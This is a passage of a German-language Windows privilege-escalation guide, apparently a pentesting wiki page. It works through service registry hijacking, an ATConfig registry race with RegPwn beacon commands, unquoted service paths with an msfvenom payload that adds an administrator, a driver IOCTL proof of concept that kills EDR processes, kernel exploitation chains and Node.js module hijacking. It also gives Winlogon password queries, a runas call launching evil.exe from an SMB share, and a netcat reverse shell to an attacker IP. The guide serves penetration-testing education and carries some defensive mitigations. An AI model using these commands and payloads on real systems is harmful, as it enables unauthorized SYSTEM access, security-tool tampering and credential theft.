reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Falls dies der Fall ist, kann die vom Dienst ausgeführte Binärdatei geändert werden.

So ändern Sie den Pfad der ausgeführten Binärdatei:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race zum Schreiben beliebiger HKLM-Werte (ATConfig)

Einige Windows-Accessibility-Features erstellen benutzerbezogene **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine Registry-**symbolic link race** kann diesen privilegierten Schreibvorgang in **jeden HKLM-Pfad** umleiten und dadurch eine primitive Funktion zum **Schreiben beliebiger HKLM-Werte** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Accessibility-Features auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert die benutzerkontrollierte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während der Anmeldung bzw. beim Wechsel auf den secure desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Missbrauchs (CVE-2026-24291 / ATConfig):

1. Setze den **HKCU-ATConfig**-Wert, der von SYSTEM geschrieben werden soll.
2. Löse das Kopieren auf den secure desktop aus (z. B. mit **LockWorkstation**), wodurch der AT broker flow gestartet wird.
3. **Gewinne die race**, indem du einen **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` platzierst; sobald der oplock ausgelöst wird, ersetze den **HKLM Session ATConfig**-Schlüssel durch einen **registry link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, führe den Pivot zu LPE durch, indem du Service-Konfigurationswerte überschreibst:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Service, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und löse ihn nach dem Schreibvorgang aus. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** als Teil der race.

Beispieltooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### AppendData/AddSubdirectory-Berechtigungen für die Services-Registry

Wenn du diese Berechtigung für eine Registry hast, bedeutet das, dass **du aus dieser Registry untergeordnete Registrys erstellen kannst**. Im Fall von Windows-Diensten ist dies **ausreichend, um beliebigen Code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jeden Teil bis zu einem Leerzeichen auszuführen.

Für den Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise, Folgendes auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Führe alle nicht in Anführungszeichen gesetzten Dienstpfade auf, mit Ausnahme derjenigen, die zu integrierten Windows-Diensten gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Du kannst diese Schwachstelle** mit metasploit erkennen und ausnutzen: `exploit/windows/local/trusted\_service\_path` Mit metasploit kannst du manuell eine Service-Binärdatei erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

Windows ermöglicht Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein service ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf ein binary verweist. Wenn dieses binary ersetzt werden kann, ist möglicherweise eine privilege escalation möglich. Weitere Details finden sich in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Anwendungen

### Installierte Anwendungen

Überprüfe die **Berechtigungen der Binaries** (möglicherweise kannst du eines überschreiben und deine privileges eskalieren) sowie der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei ändern kannst, um eine spezielle Datei zu lesen, oder ob du eine Binärdatei ändern kannst, die von einem Administrator-Konto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ lädt automatisch jede Plugin-DLL unter seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable Installation oder Kopie vorhanden ist, ermöglicht das Ablegen eines bösartigen Plugins bei jedem Start die automatische Codeausführung innerhalb von `notepad++.exe` (einschließlich aus `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du eine Registry oder Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt werden soll.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns locations zur Privilegieneskalation** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **seltsamen/verwundbaren Treibern von Drittanbietern**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber ein beliebiges Kernel-Lese-/Schreib-Primitive offenlegt (häufig bei schlecht entworfenen IOCTL-Handlern), kann die Privilegienerweiterung erfolgen, indem direkt ein SYSTEM-Token aus dem Kernel-Speicher gestohlen wird.<sup>[[13]](#references)</sup> Die schrittweise Technik ist hier beschrieben:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, kann eine absichtliche Verlangsamung der Suche (durch Komponenten mit maximaler Länge oder tiefe Verzeichnisketten) das Zeitfenster von Mikrosekunden auf mehrere zehn Mikrosekunden ausdehnen:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures und I/O ring pivots

Einige Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs aufbauen: einer **cancel-safe queue lifetime race**, die eine Request/CBD freigibt, während der Queue-Lock noch gehalten wird, und einer **lock-release-before-copy**-Disclosure, die eine freigegebene paged-pool-Allokation während `RtlCopyToUser` leakt.<sup>[[29]](#references)</sup>

Audit- und Exploitation-Hinweise:

- **Free-under-lock + cancel afterwards**: Suche nach einem Erfolgs-Pfad mit **Acquire -> CompleteRequest/free -> Release**, während der Cancel-Pfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** verwendet. Wenn der Erfolgs-Pfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` erreicht, bevor der CBDQ/CSQ-Lock freigegeben wird, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Reclaim the freed queue object** mit einer gleich großen, vom Angreifer kontrollierten paged-pool-Allokation. `NPFS` Data Queue Entries sind nützlich, weil Payload und Größe kontrollierbar sind und sie später mit Pipe-Read-/Peek-Operationen untersucht werden können. Wenn das freigegebene Objekt List-Links enthält, überschreibe sie mit einer **cyclic list of fake request nodes in user memory**, sodass der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, anstatt am ursprünglichen Listen-Head zu terminieren.
- **Upgrade a predictable write**: Wenn der Fake Request einen verschachtelten Context-Pointer umleitet, der von Bookkeeping-Writes (Timestamps / QPC / refcount-adjacent fields) verwendet wird, kann ein **address-controlled but not value-controlled** Kernel-Write entstehen. Ziele in diesem Fall das **length/size**-Feld eines gesprühten Pool-Objekts statt eines finalen Code-/Daten-Pointers an und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **out-of-bounds paged-pool read** ermöglicht.
- **Raceable disclosure pattern**: Jeder Syscall mit `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein starker Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (beispielsweise durch das Hinzufügen vieler List-/Resource-Einträge, die die finale Allokationsgröße eines Serializers erhöhen), da der längere Copy-Vorgang das Replacement-Fenster vergrößert, ohne den Rechner zwangsläufig zum Absturz zu bringen.
- **Pointer-rich refill targets**: Registrierte-Buffer-Arrays von Windows-**I/O ring** sind ausgezeichnete Disclosure-Ziele, weil ihre paged-pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Pointer auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays, ermittle das umgebende `IORING_OBJECT` und korrumpiere anschließend **`RegBuffers`** und **`RegBuffersCount`**, sodass nachfolgende I/O-ring-Operationen vom Angreifer gefälschte Entries verwenden und beliebiges Kernel-Lese-/Schreibzugriff bereitstellen. Wenn der einzige verfügbare Write ein stabiles Byte liefert (beispielsweise aus `KUSER_SHARED_DATA+0x14`), verwende **overlapping unaligned writes**, um einen User-Pointer aus wiederholten Bytes wie `0x0101010101010101` aufzubauen, mappe ihn mit `VirtualAlloc` und platziere dort das gefälschte Array registrierter Buffer.<sup>[[30]](#references)</sup>

Nützliche Debugging-Indikatoren:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Sobald du beliebiges Kernel-Read/Write über den beschädigten I/O ring erlangt hast, stiehl ein SYSTEM-Token mit dem standardmäßigen Post-Primitive-Workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry-Hive-Memory-Corruption-Primitives

Moderne Hive-Schwachstellen ermöglichen es dir, deterministische Layouts zu groom-en, beschreibbare HKLM/HKU-Nachfahren auszunutzen und Metadatenkorruption ohne einen benutzerdefinierten Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Die vollständige Kette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues`-Type-Confusion im Direct-Mode über vom Angreifer kontrollierte Pfade

Einige Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um einen gültigen UTF-16-String handelt, und rufen anschließend `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` in einen Stack-Skalar wie `int readValue` auf. Wenn `RTL_QUERY_REGISTRY_TYPECHECK` fehlt, wird `EntryContext` entsprechend dem **tatsächlichen** Registry-Typ interpretiert, nicht entsprechend dem vom Entwickler erwarteten Typ.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Oracle**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer ausgewählte Keys abzufragen, ihre Existenz über Rückgabecodes/Logs zu leaken und manchmal Werte zu lesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Memory-Corruption**: Ein Skalarziel wie `&readValue` wird abhängig vom Registry-Wertetyp als `REG_QWORD`, `UNICODE_STRING` oder als großer Binärpuffer mit Längenangabe fehlinterpretiert.

Praktische Exploitation-Hinweise:

- **Mitigation ab Windows 8**: Wenn die Abfrage eine **nicht vertrauenswürdige Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK` erreicht, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Exploitability aufrechtzuerhalten, solltest du nach **vom Angreifer beschreibbaren Keys innerhalb vertrauenswürdiger System-Hives** suchen, anstatt Werte unter `HKCU` bereitzustellen.
- **Staging in vertrauenswürdigen Hives**: Verwende NtObjectManager, um beschreibbare Nachfahren von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **Low-Integrity**-Token erneut aus, um Keys zu finden, die aus Sandbox-Kontexten erreichbar sind:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: Ein direkter 8-Byte-Schreibvorgang in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Der direct mode erwartet, dass `EntryContext` auf einen `UNICODE_STRING` zeigt. Wenn der Code zunächst ein vom Angreifer kontrolliertes `REG_DWORD` in einen skalaren Wert auf dem Stack lädt und denselben Buffer anschließend für einen String-Lesevorgang wiederverwendet, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst den `Buffer`-Zeiger teilweise. Dadurch entsteht ein teilweise kontrollierter Kernel-Schreibvorgang.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der direct mode den ersten `LONG` an `EntryContext` als vorzeichenbehaftete Buffer-Größe. Wenn ein vorheriger `REG_DWORD`-Lesevorgang einen vom Angreifer kontrollierten **negativen** Wert im wiederverwendeten skalaren Wert hinterlässt, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Dies ist häufig der sauberste Weg, um einen Callback-Zeiger vollständig zu überschreiben.

Starkes Hunting-Muster: **heterogene Registry-Lesevorgänge in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, bei denen der erste Registry-Lesevorgang kontrolliert, ob ein zweiter Lesevorgang stattfindet.

#### Ausnutzen fehlender FILE_DEVICE_SECURE_OPEN bei Device Objects (LPE + EDR kill)

Einige signierte Third-Party-Treiber erstellen ihr Device Object mit einer starken SDDL über IoCreateDeviceSecure, vergessen jedoch, `FILE_DEVICE_SECURE_OPEN` in `DeviceCharacteristics` zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Device über einen Pfad mit einer zusätzlichen Komponente geöffnet wird. Dadurch kann jeder nicht privilegierte Benutzer einen Handle erhalten, indem er einen Namespace-Pfad wie diesen verwendet:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Device öffnen kann, lassen sich vom Treiber bereitgestellte privilegierte IOCTLs für LPE und Tampering missbrauchen. In freier Wildbahn beobachtete Möglichkeiten:
- Vollzugriffs-Handles auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränktes Lesen/Schreiben von Raw-Disk-Daten (Offline-Tampering, Tricks für Boot-Time-Persistence).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch sich AV/EDR aus dem Userland über den Kernel beenden lässt.

Minimales PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Validiere den Kontext des Aufrufers für privilegierte Vorgänge. Führe PP/PPL-Prüfungen durch, bevor das Beenden von Prozessen oder die Rückgabe von Handles erlaubt wird.
- Beschränke IOCTLs (Zugriffs-Masken, METHOD_*, Eingabevalidierung) und ziehe Broker-Modelle anstelle direkter Kernel-Privilegien in Betracht.

Erkennungsideen für Verteidiger
- Überwache User-Mode-Öffnungen verdächtiger Gerätenamen (z. B. \\ .\\amsdk*) und bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Erzwinge Microsofts Blockliste für anfällige Treiber (HVCI/WDAC/Smart App Control) und pflege eigene Allow-/Deny-Listen.


## PATH DLL Hijacking

Wenn du **Schreibberechtigungen innerhalb eines Ordners besitzt, der in PATH vorhanden ist**, könntest du eine von einem Prozess geladene DLL hijacken und **deine Privilegien eskalieren**.<sup>[[2]](#references)</sup>

Überprüfe die Berechtigungen aller Ordner innerhalb von PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Weitere Informationen dazu, wie diese Prüfung ausgenutzt werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js-/Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **Windows uncontrolled search path**, die **Node.js-** und **Electron**-Anwendungen betrifft, wenn sie einen Bare-Import wie `require("foo")` durchführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node löst Packages auf, indem es im Verzeichnisbaum nach oben geht und die `node_modules`-Ordner jedes übergeordneten Verzeichnisses prüft. Unter Windows kann dieser Suchlauf das Laufwerksstammverzeichnis erreichen. Daher kann eine Anwendung, die von `C:\Users\Administrator\project\app.js` aus gestartet wird, folgende Pfade prüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit niedrigen Berechtigungen** `C:\node_modules` erstellen kann, kann er eine schädliche `foo.js`-Datei (oder einen Package-Ordner) platzieren und darauf warten, dass ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Dependency auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch entsteht **LPE**, sobald das Ziel als Administrator, aus einem privilegierten Scheduled Task/Service-Wrapper oder aus einer automatisch gestarteten privilegierten Desktop-Anwendung ausgeführt wird.

Dies kommt besonders häufig vor, wenn:

- eine Dependency in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Third-Party-Library `require("foo")` in `try/catch` kapselt und bei einem Fehler fortfährt
- ein Package aus Production-Builds entfernt, beim Packaging ausgelassen wurde oder die Installation fehlgeschlagen ist
- sich der verwundbare `require()` tief im Dependency-Tree statt im Hauptcode der Anwendung befindet

### Suche nach verwundbaren Zielen

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = ausführbare Datei des Ziels (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Konzentriere dich auf `NAME NOT FOUND` und das abschließende erfolgreiche Öffnen unter `C:\node_modules`

Nützliche Code-Review-Muster in entpackten `.asar`-Dateien oder den Anwendungsquellen:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Ermittle den **fehlenden Paketnamen** anhand von Procmon oder durch Überprüfung des Quellcodes.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:
```powershell
mkdir C:\node_modules
```
3. Lege ein Modul mit dem exakt erwarteten Namen ab:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Triggern Sie die Opferanwendung. Wenn die Anwendung `require("foo")` ausführt und das legitime Modul fehlt, lädt Node möglicherweise `C:\node_modules\foo.js`.

Beispiele aus der Praxis für fehlende optionale Module, die diesem Muster entsprechen, sind `bluebird` und `utf-8-validate`. Der wiederverwendbare Teil ist jedoch die **Technik**: Finden Sie einen beliebigen **fehlenden bare import**, den ein privilegierter Windows-Node/Electron-Prozess auflösen wird.

### Ideen zur Erkennung und Härtung

- Alarmieren Sie, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien bzw. Packages schreibt.
- Suchen Sie nach Prozessen mit hoher Integrität, die aus `C:\node_modules\*` lesen.
- Packen Sie alle Runtime-Abhängigkeiten in Production und prüfen Sie die Verwendung von `optionalDependencies`.
- Überprüfen Sie Third-Party-Code auf stumme `try { require("...") } catch {}`-Muster.
- Deaktivieren Sie optionale Prüfungen, wenn die Library dies unterstützt (beispielsweise können einige `ws`-Deployments die Legacy-`utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` vermeiden).

## Netzwerk

### Freigaben
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Prüfe die hosts-Datei auf weitere bekannte Computer, die dort fest eingetragen sind.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**.
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Auf dieser Seite findest du Befehle im Zusammenhang mit Firewalls**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere[ Befehle zur Netzwerkaufklärung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows-Subsystem für Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die Binärdatei `bash.exe` kann auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden.

Wenn du den root user erhältst, kannst du an jedem Port lauschen (wenn du `nc.exe` zum ersten Mal verwendest, um an einem Port zu lauschen, wirst du per GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

## Windows-Anmeldedaten

### Winlogon-Anmeldedaten
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Anmeldeinformationsverwaltung / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, die **Windows** verwenden kann, um **Benutzer automatisch anzumelden**. Zunächst könnte dies so klingen, als könnten Benutzer Anmeldeinformationen für Websites wie Facebook, Twitter oder Gmail speichern und Browser sich automatisch anmelden lassen. So funktioniert es jedoch nicht.

Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource zuzugreifen** (einen Server oder eine Website), diese **Credential Manager**- und Windows-Vault-Funktion nutzen und die bereitgestellten Anmeldeinformationen verwenden kann, anstatt dass Benutzer jedes Mal den Benutzernamen und das Passwort eingeben müssen.

Sofern die Anwendungen nicht mit dem Credential Manager interagieren, können sie die Anmeldeinformationen für eine bestimmte Ressource meiner Meinung nach nicht verwenden. Wenn deine Anwendung also den Vault nutzen möchte, sollte sie auf irgendeine Weise **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem standardmäßigen Speicher-Vault anfordern.

Verwende `cmdkey`, um die auf dem Computer gespeicherten Anmeldeinformationen aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldedaten.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
